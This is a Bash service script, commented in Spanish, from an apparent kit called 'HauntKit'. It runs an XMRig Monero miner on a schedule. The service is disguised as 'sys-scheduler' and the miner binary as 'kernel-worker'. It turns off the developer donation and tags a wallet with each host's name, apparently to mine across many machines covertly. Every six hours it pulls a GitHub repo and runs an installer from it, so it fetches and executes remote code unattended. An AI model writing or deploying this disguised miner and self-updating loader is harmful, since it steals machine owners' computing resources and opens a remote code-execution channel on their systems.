#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Servicio de Minería (sys-scheduler)
#  Controla XMRig con horarios inteligentes
#  Solo mina entre START_HOUR y END_HOUR (hora Colombia)
#  Auto-update: verifica versión en GitHub cada 6h
# ════════════════════════════════════════════════════════

# ─── Rutas fijas ───
HAUNTKIT_DIR="/opt/hauntkit"
REPO_DIR="/opt/hauntkit/repo"
CONFIG="$HAUNTKIT_DIR/mine-config.env"
XMRIG_DIR="$HAUNTKIT_DIR/xmrig"
XMRIG_BIN="$XMRIG_DIR/kernel-worker"
XMRIG_LOG="$XMRIG_DIR/miner.log"
PID_FILE="$XMRIG_DIR/miner.pid"
VERSION_FILE="$HAUNTKIT_DIR/VERSION"
TZ="America/Bogota"
REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERSION"

# ─── Cargar configuración ───
if [ -f "$CONFIG" ]; then
    source "$CONFIG"
else
    echo "[ERROR] No se encuentra $CONFIG"
    exit 1
fi

# ─── Construir wallet completo con hostname ───
FULL_WALLET="${WALLET_BASE}.$(hostname)"

# ─── Leer versión local ───
LOCAL_VERSION="0.0.0"
[ -f "$VERSION_FILE" ] && LOCAL_VERSION=$(cat "$VERSION_FILE")

# ─── Contador para auto-update (cada 360 ciclos = ~6h) ───
UPDATE_INTERVAL=360
update_counter=0

# ─── Función: ¿Estamos en hora permitida? ───
is_allowed_hour() {
    local hour
    hour=$(TZ=$TZ date +%-H)
    [ "$hour" -ge "$START_HOUR" ] || [ "$hour" -lt "$END_HOUR" ]
}

# ─── Función: ¿El minero está vivo? ───
is_miner_alive() {
    [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
}

# ─── Función: Iniciar minero ───
start_miner() {
    is_miner_alive && return 0

    local threads=""
    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"

    mkdir -p "$XMRIG_DIR"
    cd "$XMRIG_DIR" || return 1

    "$XMRIG_BIN" $threads \
        -o "$POOL_URL" \
        -u "$FULL_WALLET" \
        -p "x" \
        --cpu-max-threads-hint="$MAX_CPU" \
        --donate-level=0 \
        --keepalive \
        >> "$XMRIG_LOG" 2>&1 &

    echo $! > "$PID_FILE"
    echo "[$(TZ=$TZ date '+%F %T')] Minero iniciado (PID $!)" >> "$XMRIG_LOG"
}

# ─── Función: Detener minero ───
stop_miner() {
    if is_miner_alive; then
        local pid
        pid=$(cat "$PID_FILE")
        kill "$pid" 2>/dev/null
        sleep 2
        kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
        rm -f "$PID_FILE"
        echo "[$(TZ=$TZ date '+%F %T')] Minero detenido" >> "$XMRIG_LOG"
    fi
}

# ─── Función: Verificar temperatura ───
check_temp() {
    [ "$MAX_TEMP" -eq 0 ] && return 0
    local temp
    if command -v sensors &>/dev/null; then
        temp=$(sensors -u 2>/dev/null | grep -m1 'temp1_input' | awk '{print $2}' | cut -d. -f1)
        [ -z "$temp" ] && return 0
        [ "$temp" -ge "$MAX_TEMP" ] && return 1
    fi
    return 0
}

# ─── Función: Verificar actualización en GitHub ───
check_update() {
    local remote_version
    remote_version=$(curl -sL --max-time 10 "$REMOTE_VERSION_URL" 2>/dev/null | head -1)

    if [ -z "$remote_version" ]; then
        echo "[$(TZ=$TZ date '+%F %T')] Update: no se pudo conectar con GitHub" >> "$XMRIG_LOG"
        return 1
    fi

    remote_version=$(echo "$remote_version" | tr -d ' \n\r')

    if [ "$remote_version" = "$LOCAL_VERSION" ]; then
        return 1  # Misma versión, no hay update
    fi

    echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión disponible: $remote_version (actual: $LOCAL_VERSION)" >> "$XMRIG_LOG"
    return 0  # Hay update
}

# ─── Función: Aplicar actualización ───
apply_update() {
    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando actualización..." >> "$XMRIG_LOG"

    # Detener minero antes de actualizar
    stop_miner

    if [ -d "$REPO_DIR/.git" ]; then
        git -C "$REPO_DIR" pull >> "$XMRIG_LOG" 2>&1
    else
        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado en $REPO_DIR, clonando..." >> "$XMRIG_LOG"
        mkdir -p "$REPO_DIR"
        git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$XMRIG_LOG" 2>&1
    fi

    # Actualizar scripts y binarios (sin tocar la config)
    bash "$REPO_DIR/tools/utils/mine-install.sh" --update >> "$XMRIG_LOG" 2>&1

    # Actualizar versión local
    [ -f "$REPO_DIR/VERSION" ] && cp "$REPO_DIR/VERSION" "$VERSION_FILE"

    echo "[$(TZ=$TZ date '+%F %T')] Update: actualización completada, reiniciando servicio..." >> "$XMRIG_LOG"

    # Reiniciar el servicio con la nueva versión
    exec "$0"
}

# ─── Limpieza al salir ───
cleanup() {
    echo "[$(TZ=$TZ date '+%F %T')] Servicio deteniéndose..." >> "$XMRIG_LOG"
    stop_miner
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

# ─── Bucle principal ───
echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$XMRIG_LOG"
echo "[$(TZ=$TZ date '+%F %T')] Horario: $START_HOUR:00 a $END_HOUR:00" >> "$XMRIG_LOG"
echo "[$(TZ=$TZ date '+%F %T')] Wallet: $FULL_WALLET" >> "$XMRIG_LOG"

while true; do
    # ─── Control de horario ───
    if is_allowed_hour; then
        if ! check_temp; then
            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$XMRIG_LOG"
            stop_miner
            sleep 120
            continue
        fi
        start_miner
    else
        stop_miner
    fi

    # ─── Auto-update: cada ~6h ───
    update_counter=$((update_counter + 1))
    if [ "$update_counter" -ge "$UPDATE_INTERVAL" ]; then
        update_counter=0
        if check_update; then
            apply_update
            # apply_update ejecuta exec, no se vuelve aquí
        fi
    fi

    sleep 60
done
